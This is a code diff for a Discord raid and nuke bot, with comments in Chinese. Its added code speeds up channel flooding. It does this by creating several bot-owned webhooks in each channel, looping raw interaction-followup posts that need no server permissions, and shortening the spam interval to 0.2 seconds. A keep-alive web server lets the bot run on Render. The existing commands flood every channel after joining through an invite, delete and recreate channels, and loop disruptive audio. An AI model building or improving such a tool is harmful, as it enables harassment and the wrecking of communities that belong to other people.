@@ -50,6 +50,46 @@ MESSAGES = [
 active_spam_channels = {} # {id: {"obj": channel, "msg": str}}
 active_webhooks = {}      # {url: {"nick": nickname, "msg": str}}
 active_audio_guilds = set() # {guild_id} - 記錄哪些伺服器正在無限輪播爆音板
+active_use_spams = {}     # {channel_id: asyncio.Task}
+active_channel_webhooks = {}  # {channel_id: [webhook_url1, webhook_url2, ...]}
+
+async def send_raw_followup(session, app_id, token, content):
+    url = f"https://discord.com/api/v10/webhooks/{app_id}/{token}"
+    payload = {"content": content}
+    try:
+        async with session.post(url, json=payload) as resp:
+            return resp.status
+    except Exception as e:
+        return e
+
+
+async def prepare_channel_webhooks(channel):
+    if channel.id in active_channel_webhooks:
+        return active_channel_webhooks[channel.id]
+    
+    urls = []
+    try:
+        if hasattr(channel, "permissions_for") and hasattr(channel, "guild"):
+            permissions = channel.permissions_for(channel.guild.me)
+            if not permissions.manage_webhooks:
+                return []
+                
+            existing = await channel.webhooks()
+            # 找出我們 bot 建立的 webhook
+            our_webhooks = [w for w in existing if w.user and w.user.id == bot.user.id]
+            
+            while len(our_webhooks) < 3:
+                name = f"FW_Hook_{random.randint(1000, 9999)}"
+                new_hook = await channel.create_webhook(name=name)
+                our_webhooks.append(new_hook)
+                await asyncio.sleep(0.1)
+                
+            urls = [w.url for w in our_webhooks[:3]]
+            active_channel_webhooks[channel.id] = urls
+    except Exception as e:
+        logger.warning(f"無法為頻道 {channel.name} ({channel.id}) 建立 Webhook: {e}")
+        
+    return urls
 
 # =======================================================
 
@@ -91,6 +131,31 @@ async def on_ready():
     logger.info(f"✅ 成功登入為 {bot.user} (ID: {bot.user.id})")
     logger.info("🤖 機器人已準備就緒！")
     logger.info("可用指令：/use, /nuke, /raid, /stop, /stop_all, /clear, /webhook_use")
+
+@bot.event
+async def on_voice_state_update(member, before, after):
+    # 如果是機器人自己變更狀態，不處理
+    if member.bot:
+        return
+
+    # 取得該伺服器的語音連線狀態
+    voice_client = member.guild.voice_client
+    if not voice_client or not voice_client.is_connected():
+        return
+
+    # 當有人離開語音頻道，且該頻道是機器人所在的頻道
+    if before.channel and before.channel.id == voice_client.channel.id:
+        # 計算頻道內還有多少真人
+        non_bot_members = [m for m in voice_client.channel.members if not m.bot]
+        
+        # 如果已經沒有真人了，自動退出
+        if len(non_bot_members) == 0:
+            logger.info(f"語音頻道 {voice_client.channel.name} 已無其他成員，機器人自動退出。")
+            await voice_client.disconnect()
+            
+            # 如果爆音板輪播功能正在該伺服器運行，也一併停止
+            if member.guild.id in active_audio_guilds:
+                active_audio_guilds.discard(member.guild.id)
 @bot.tree.command(name="raid", description="💣 突擊模式：給機器人邀請連結，它會自動加入並立即對所有頻道開炸")
 @discord.app_commands.describe(invite="伺服器邀請連結 (例如: https://discord.gg/abc123)", content="自訂炸頻內容 (選填)")
 async def raid_command(interaction: discord.Interaction, invite: str, content: str = None):
@@ -155,34 +220,91 @@ class SpamButtonView(discord.ui.View):
         super().__init__(timeout=None)
         self.content = content
 
-    @discord.ui.button(label="💥 點一次發射 10 條訊息", style=discord.ButtonStyle.danger)
-    async def spam_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+    @discord.ui.button(label="💥 點一次發 5 條", style=discord.ButtonStyle.danger, custom_id="spam_btn_burst5")
+    async def burst5_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(ephemeral=True)
         msg = self.content if self.content else random.choice(MESSAGES)
-        
-        # 平行發送，不等待每條，速度提升 ~10x
-        tasks = [interaction.followup.send(msg, ephemeral=False) for _ in range(10)]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        count = sum(1 for r in results if not isinstance(r, Exception))
+
+        async with aiohttp.ClientSession() as session:
+            tasks = [send_raw_followup(session, interaction.application_id, interaction.token, msg) for _ in range(5)]
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+
+        count = sum(1 for r in results if r in (200, 201, 204))
         try:
             await interaction.followup.send(f"✅ 成功發送 {count} 條！", ephemeral=True)
         except Exception:
-            pass  # 429 rate limit 在確認訊息上，無視即可（垃圾訊息已發出）
+            pass
 
-@bot.tree.command(name="use", description="在此頻道召喚炸頻控制面板（支援使用者安裝）")
+    @discord.ui.button(label="🚀 開啟自動連發", style=discord.ButtonStyle.success, custom_id="spam_btn_start_auto")
+    async def start_auto_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(ephemeral=True)
+        cid = interaction.channel_id
+
+        # 如果已經在發送，先停止舊的
+        if cid in active_use_spams:
+            active_use_spams[cid].cancel()
+
+        msg = self.content if self.content else None
+
+        # 啟動自動連發協程，傳入 app_id 與 token
+        task = asyncio.create_task(
+            self.auto_spam_loop(cid, interaction.application_id, interaction.token, msg)
+        )
+        active_use_spams[cid] = task
+
+        try:
+            await interaction.followup.send("🚀 **自動連發已啟動！** 正在背景持續發送中...", ephemeral=True)
+        except Exception:
+            pass
+
+    @discord.ui.button(label="🛑 停止自動連發", style=discord.ButtonStyle.secondary, custom_id="spam_btn_stop_auto")
+    async def stop_auto_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.defer(ephemeral=True)
+        cid = interaction.channel_id
+
+        if cid in active_use_spams:
+            active_use_spams[cid].cancel()
+            del active_use_spams[cid]
+            try:
+                await interaction.followup.send("🛑 **已成功停止自動連發！**", ephemeral=True)
+            except Exception:
+                pass
+        else:
+            try:
+                await interaction.followup.send("⚠️ 此頻道目前沒有正在運行的自動連發任務喔！", ephemeral=True)
+            except Exception:
+                pass
+
+    async def auto_spam_loop(self, channel_id, app_id, token, content):
+        """純 Interaction Followup 自動連發，無需任何伺服器權限。"""
+        try:
+            async with aiohttp.ClientSession() as session:
+                while True:
+                    msg = content if content else random.choice(MESSAGES)
+                    # 每輪同時發送 5 條，不需要任何伺服器權限
+                    tasks = [send_raw_followup(session, app_id, token, msg) for _ in range(5)]
+                    await asyncio.gather(*tasks, return_exceptions=True)
+                    await asyncio.sleep(0.5)
+        except asyncio.CancelledError:
+            pass
+        except Exception as e:
+            logger.error(f"[auto_spam_loop] 發生錯誤: {e}")
+
+
+@bot.tree.command(name="use", description="召喚無權限自動發送面板（支援使用者安裝，不需加入伺服器）")
 @discord.app_commands.allowed_installs(guilds=True, users=True)
 @discord.app_commands.allowed_contexts(guilds=True, dms=False, private_channels=True)
 @discord.app_commands.describe(content="自訂發送內容 (選填)")
 async def use_command(interaction: discord.Interaction, content: str = None):
     view = SpamButtonView(content)
     await interaction.response.send_message(
-        "🛠️ **控制面板已就緒！**\n"
-        "每次點擊最多發 10 條。\n"
-        "👇 **請點擊下方按鈕**", 
-        view=view, 
+        "🛠️ **無權限發送面板已就緒！**\n"
+        "👉 **點擊「開啟自動連發」** 在背景持續發送訊息\n"
+        "👉 **點擊「停止自動連發」** 隨時停止",
+        view=view,
         ephemeral=True
     )
-    logger.info(f"指令：/use 啟動了控制面板，內容: {content}")
+    logger.info(f"指令：/use 啟動了無權限發送面板，內容: {content}")
 
 
 @bot.tree.command(name="stop", description="停止在此頻道或指定頻道自動發送訊息")
@@ -191,17 +313,26 @@ async def stop_command(interaction: discord.Interaction, target_id: str = None):
     # 定義目標 ID
     cid = int(target_id) if target_id else interaction.channel_id
     
+    stopped = False
+    
     if cid in active_spam_channels:
         channel_name = active_spam_channels[cid]["obj"].name
         del active_spam_channels[cid]
-        await interaction.response.send_message(f"🛑 已停止在頻道 `{channel_name}` (ID: {cid}) 的自動發送", ephemeral=True)
+        stopped = True
         logger.info(f"指令：停止在頻道 {channel_name} ({cid}) 發送")
-        
-        # 如果所有頻道都停了，就把背景任務關掉省資源
         if not active_spam_channels and spam_task.is_running():
             spam_task.stop()
+
+    if cid in active_use_spams:
+        active_use_spams[cid].cancel()
+        del active_use_spams[cid]
+        stopped = True
+        logger.info(f"指令：停止在頻道 {cid} 的 /use 自動連發")
+
+    if stopped:
+        await interaction.response.send_message(f"🛑 已停止在頻道 `{cid}` 的所有自動發送任務", ephemeral=True)
     else:
-        await interaction.response.send_message(f"⚠️ ID `{cid}` 的頻道目前沒有在自動發送喔！", ephemeral=True)
+        await interaction.response.send_message(f"⚠️ ID `{cid}` 的頻道目前沒有任何活動的發送任務喔！", ephemeral=True)
 
 @bot.tree.command(name="nuke", description="⛔ 核彈模式：刪除頻道、新建頻道並修改伺服器名稱 (極端危險)")
 @discord.app_commands.describe(
@@ -283,11 +414,19 @@ async def stop_all_command(interaction: discord.Interaction):
         return
 
     removed_count = 0
+    # 停止 active_spam_channels 任務
     for cid, data in list(active_spam_channels.items()):
         if data["obj"].guild.id == guild.id:
             del active_spam_channels[cid]
             removed_count += 1
             
+    # 停止 active_use_spams 任務
+    for channel in guild.text_channels:
+        if channel.id in active_use_spams:
+            active_use_spams[channel.id].cancel()
+            del active_use_spams[channel.id]
+            removed_count += 1
+
     if removed_count > 0:
         await interaction.response.send_message(f"🛑 已停止伺服器內 `{removed_count}` 個發送任務。", ephemeral=True)
         if not active_spam_channels and spam_task.is_running():
@@ -461,21 +600,46 @@ async def set_msg_command(interaction: discord.Interaction, text: str):
 
 BURST_PER_TICK = 3  # 每次 tick 每個頻道發送幾條（調高=更快，但容易被 rate limit）
 
-@tasks.loop(seconds=0.5)  # 原本 1.0s，改為 0.5s → 頻率 x2
+@tasks.loop(seconds=0.2)  # 優化為 0.2 秒一次
 async def spam_task():
-    tasks_to_run = []
-    
-    for cid, data in list(active_spam_channels.items()):
-        # 每個頻道一次發 BURST_PER_TICK 條
-        for _ in range(BURST_PER_TICK):
+    if not active_spam_channels:
+        return
+
+    async with aiohttp.ClientSession() as session:
+        tasks_to_run = []
+        
+        for cid, data in list(active_spam_channels.items()):
+            channel = data["obj"]
             msg = data["msg"] if data["msg"] else random.choice(MESSAGES)
-            tasks_to_run.append(data["obj"].send(msg))
             
-    if tasks_to_run:
-        results = await asyncio.gather(*tasks_to_run, return_exceptions=True)
-        fails = sum(1 for r in results if isinstance(r, Exception))
-        if fails:
-            logger.warning(f"[spam_task] {fails}/{len(tasks_to_run)} 條發送失敗（可能 rate limit）")
+            # 獲取或建立 Webhook
+            urls = await prepare_channel_webhooks(channel)
+            
+            if urls:
+                # 使用 Webhook 發送
+                for url in urls:
+                    # 每個 Webhook 在每個 tick 發 2 條
+                    for _ in range(2):
+                        payload = {
+                            "content": msg,
+                            "username": "ORRICAC_FW"
+                        }
+                        tasks_to_run.append(session.post(url, json=payload))
+            else:
+                # 回退到標準發送
+                for _ in range(BURST_PER_TICK):
+                    tasks_to_run.append(channel.send(msg))
+                    
+        if tasks_to_run:
+            results = await asyncio.gather(*tasks_to_run, return_exceptions=True)
+            fails = 0
+            for r in results:
+                if isinstance(r, Exception):
+                    fails += 1
+                elif hasattr(r, 'status') and r.status not in (200, 201, 204):
+                    fails += 1
+            if fails:
+                logger.warning(f"[spam_task] {fails}/{len(tasks_to_run)} 條發送失敗（可能 rate limit）")
 
 @tasks.loop(seconds=0.5)  # 原本 1.0s，改為 0.5s
 async def webhook_spam_task():
@@ -633,11 +797,40 @@ def play_next_audio(guild: discord.Guild):
         # 如果出錯，過幾秒再試一次
         bot.loop.call_later(3.0, play_next_audio, guild)
 
+# --- Render Web Service 用的簡易 HTTP 伺服器 ---
+import threading
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import os
+
+class PingHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain; charset=utf-8')
+        self.end_headers()
+        self.wfile.write(b"Bot is alive! Hosted on Render.")
+        
+    def log_message(self, format, *args):
+        pass  # 關閉 HTTP 請求日誌以防洗頻
+
+def run_web_server():
+    port = int(os.environ.get("PORT", 8080)) # Render 預設會帶 PORT 環境變數
+    server = HTTPServer(('0.0.0.0', port), PingHandler)
+    logger.info(f"🌐 簡易 Web 伺服器啟動於 port {port} (支援 Render)")
+    server.serve_forever()
+
+def keep_alive():
+    t = threading.Thread(target=run_web_server)
+    t.daemon = True
+    t.start()
+# ---------------------------------------------
 
 if __name__ == "__main__":
     if not TOKEN.strip():
         logger.error("錯誤：TOKEN 為空，請檢查 .env 檔案")
         sys.exit(1)
+        
+    # 啟動 Web 伺服器來滿足 Render Web Service 需要綁定 Port 的需求
+    keep_alive()
         
     try:
         bot.run(TOKEN)
